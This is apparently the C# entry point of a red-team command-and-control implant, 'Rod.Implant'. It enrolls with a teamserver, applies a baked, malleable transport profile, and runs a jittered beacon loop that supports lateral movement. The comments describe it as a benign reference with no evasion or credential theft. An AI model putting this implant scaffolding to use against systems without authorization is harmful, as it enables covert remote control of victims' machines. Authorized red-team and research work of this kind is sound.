// Rod.Implant is the reference .NET stage-2 implant (). It enrolls
// into an engagement, opens the mTLS beacon stream, and runs the standard-
// category capability verbs the teamserver dispatches (architecture.md Sec 5,
// Sec 10.1). It is a benign reference: no evasion, no obfuscation, and no
// destructive behavior (RESPONSIBLE-USE.md, architecture.md Sec 7); keyboard
// capture and LSASS dumping stay out-of-tree by the Sec 13 boundary. It proves
// the end-to-end slice -- enroll, beacon, task -- against the real teamserver
// and gives the .NET build unit something real to compile.

using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Rod.Implant;
using Rod.Implant.Internal;

return await ImplantApp.RunAsync(args);

internal static class ImplantApp
{
    public static async Task<int> RunAsync(string[] args)
    {
        using var cts = new CancellationTokenSource();
        Console.CancelKeyPress += (_, e) =>
        {
            e.Cancel = true;
            cts.Cancel();
        };

        // A profile baked in at build time (the generated BakedProfile class) seeds
        // the defaults; explicit flags and env still win over it, so an operator
        // can override at run time.
        BakedProfileSupport.SeedFromBaked();

        Config config;
        try
        {
            config = Config.Parse(args);
        }
        catch (ExitProgramException ex)
        {
            // ExitProgramException carries an explicit message only when there is
            // something to print beyond what Config already wrote (e.g. -h already
            // printed usage). A null message means "already reported, stay quiet".
            if (ex.Message is { Length: > 0 } msg)
                Console.Error.WriteLine("rod-implant: " + msg);
            return ex.ExitCode;
        }

        if (config.HasKillDate && DateTimeOffset.Now > config.KillDate)
        {
            Console.Error.WriteLine($"rod-implant: kill date {config.KillDate:O} has passed; refusing to run");
            return 1;
        }

        // The implant owns its private key; only the public half crosses enroll
        // (architecture.md Sec 9). 2048-bit RSA matches the dev CA's leaf key size.
        Console.Error.WriteLine("rod-implant: generating implant keypair");
        using var privateKey = RSA.Create(2048);

        var serverCAs = CACertLoader.LoadOptional(config.CACertPath);

        // The malleable transport profile (architecture.md Sec 7, ) shapes the
        // enroll request: a profiled enroll path, User-Agent, custom headers, a
        // per-request timeout, and an optional base64 body envelope. The enroll URL
        // carries the profile's path; the profile carries the rest.
        var enrollUrl = config.ResolvedEnrollURL();
        Console.Error.WriteLine($"rod-implant: enrolling at {enrollUrl}");
        Enrollment enrollment;
        try
        {
            enrollment = await EnrollWithRetryAsync(enrollUrl, config, privateKey, serverCAs, cts.Token);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"rod-implant: enroll: {ex.Message}");
            return 1;
        }
        Console.Error.WriteLine($"rod-implant: enrolled: implant={enrollment.ImplantId} engagement={enrollment.EngagementId}");

        var beaconUrl = config.BeaconURL;
        if (beaconUrl.Length == 0)
            beaconUrl = Endpoints.BeaconUrlFromEnroll(config.EnrollURL);

        // The lateral.move handler re-enrolls a child against the same enroll path,
        // naming this implant as parent (architecture.md Sec 10.1). Carry the enroll
        // inputs and the parent's own id into the runner so a dispatched lateral.move
        // can derive a child that enrolls back. The child's stager token arrives in
        // the task arguments, not here: this implant's own token is already spent.
        var enroll = new EnrollBundle
        {
            Url = enrollUrl,
            ParentId = enrollment.ImplantId,
            Profile = config.Transport,
            CAs = serverCAs,
        };

        var beacon = new Beacon(
            beaconUrl, enrollment.ImplantId, enrollment.Leaf, enrollment.PrivateKey, enrollment.CAs,
            config.Sleep, config.Jitter, config.HasKillDate ? config.KillDate : null, enroll, Console.Error);
        try
        {
            await beacon.RunAsync(cts.Token);
        }
        catch (OperationCanceledException)
        {
            // Clean shutdown via Ctrl-C.
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"rod-implant: beacon: {ex.Message}");
            return 1;
        }

        return 0;
    }

    // Enrolls with bounded retries: a transient failure (teamserver restarting,
    // network flap) backs off exponentially, while a definitive rejection (bad,
    // spent, or expired token, malformed response) fails immediately -- retrying
    // would not change that answer.
    private static async Task<Enrollment> EnrollWithRetryAsync(
        string enrollUrl,
        Config config,
        RSA privateKey,
        X509Certificate2Collection? serverCAs,
        CancellationToken cancellationToken)
    {
        const int maxAttempts = 5;
        for (var attempt = 1; ; attempt++)
        {
            try
            {
                return await C2.EnrollAsync(
                    enrollUrl, config.StagerToken, parentImplantId: null, privateKey, serverCAs, config.Transport, cancellationToken: cancellationToken);
            }
            catch (C2.EnrollRejectedException)
            {
                throw;
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (Exception ex)
            {
                if (attempt == maxAttempts)
                    throw;
                Console.Error.WriteLine($"rod-implant: enroll attempt {attempt} failed: {ex.Message}; retrying");
                try
                {
                    await Task.Delay(TimeSpan.FromSeconds(Math.Pow(2, attempt)), cancellationToken);
                }
                catch (OperationCanceledException)
                {
                    throw;
                }
            }
        }
    }
}

// Helpers split into small static classes so the top-level Program stays
// readable and each helper is independently testable. These are benign support
// code with no implant-only tradecraft.

internal static class CACertLoader
{
    // Loads an optional PEM-encoded CA bundle from a file path; the implant pins
    // it as the teamserver identity for the enroll TLS connection. An empty path
    // returns null (system roots / trust the chain returned at enroll).
    public static X509Certificate2Collection? LoadOptional(string path)
    {
        if (path.Length == 0)
            return null;
        var collection = new X509Certificate2Collection();
        collection.ImportFromPemFile(path);
        if (collection.Count == 0)
            throw new InvalidOperationException($"no PEM certificates found in '{path}'");
        return collection;
    }
}

internal static class Endpoints
{
    // Derives the beacon URL (host:port) from the enroll URL by stripping the
    // /implants/enroll path. Lets the operator pass a single endpoint.
    public static string BeaconUrlFromEnroll(string enrollUrl)
    {
        const string suffix = "/implants/enroll";
        var u = enrollUrl;
        if (u.EndsWith(suffix, StringComparison.OrdinalIgnoreCase))
            u = u[..^suffix.Length];
        // The integration test passes "-beacon-url 127.0.0.1:port" explicitly, so
        // this derivation only matters when the two hosts coincide.
        return u;
    }
}

internal static class BakedProfileSupport
{
    // Applies the build-time baked profile as the defaults for any config field
    // the operator did not supply via flag or env. The baked value is base64-URL
    // JSON (the build unit writes it into the generated BakedProfile class).
    // Malformed baked data is ignored -- a bad bake must not crash the implant, it
    // just falls back to flag/env.
    public static void SeedFromBaked()
    {
        var bakedJson = BakedProfile.Json;
        if (bakedJson.Length == 0)
            return;
        string raw;
        try
        {
            raw = DecodeBase64Url(bakedJson);
        }
        catch
        {
            return;
        }
        using var doc = System.Text.Json.JsonDocument.Parse(raw);
        var root = doc.RootElement;
        // Map baked keys to the same ROD_* env names config.Parse reads; only set
        // env when it is not already present, so an explicit env always wins over
        // the bake.
        SetEnvIfPresent(root, "enrollURL", "ROD_ENROLL_URL");
        SetEnvIfPresent(root, "beaconURL", "ROD_BEACON_URL");
        SetEnvIfPresent(root, "token", "ROD_STAGER_TOKEN");
        SetEnvIfPresent(root, "sleep", "ROD_SLEEP");
        SetEnvIfPresent(root, "jitter", "ROD_JITTER");
        SetEnvIfPresent(root, "killDate", "ROD_KILL_DATE");
        SetEnvIfPresent(root, "enrollPath", "ROD_ENROLL_PATH");
        SetEnvIfPresent(root, "userAgent", "ROD_USER_AGENT");
        SetEnvIfPresent(root, "requestTimeout", "ROD_REQUEST_TIMEOUT");
        SetEnvIfPresent(root, "envelope", "ROD_ENVELOPE");
        // Headers ride as a nested object; re-emit the raw JSON verbatim into
        // ROD_HEADERS, which config.Parse decodes back into the header map.
        if (root.TryGetProperty("headers", out var headers)
            && headers.ValueKind == System.Text.Json.JsonValueKind.Object
            && Environment.GetEnvironmentVariable("ROD_HEADERS") is null)
        {
            Environment.SetEnvironmentVariable("ROD_HEADERS", headers.GetRawText());
        }
    }

    private static void SetEnvIfPresent(System.Text.Json.JsonElement root, string jsonKey, string envKey)
    {
        if (root.TryGetProperty(jsonKey, out var value) && value.ValueKind == System.Text.Json.JsonValueKind.String)
        {
            var s = value.GetString();
            if (!string.IsNullOrEmpty(s) && Environment.GetEnvironmentVariable(envKey) is null)
                Environment.SetEnvironmentVariable(envKey, s);
        }
    }

    private static string DecodeBase64Url(string value)
    {
        var padded = value.Replace('-', '+').Replace('_', '/');
        padded = padded.PadRight((padded.Length + 3) & ~3, '=');
        var bytes = Convert.FromBase64String(padded);
        return System.Text.Encoding.UTF8.GetString(bytes);
    }
}
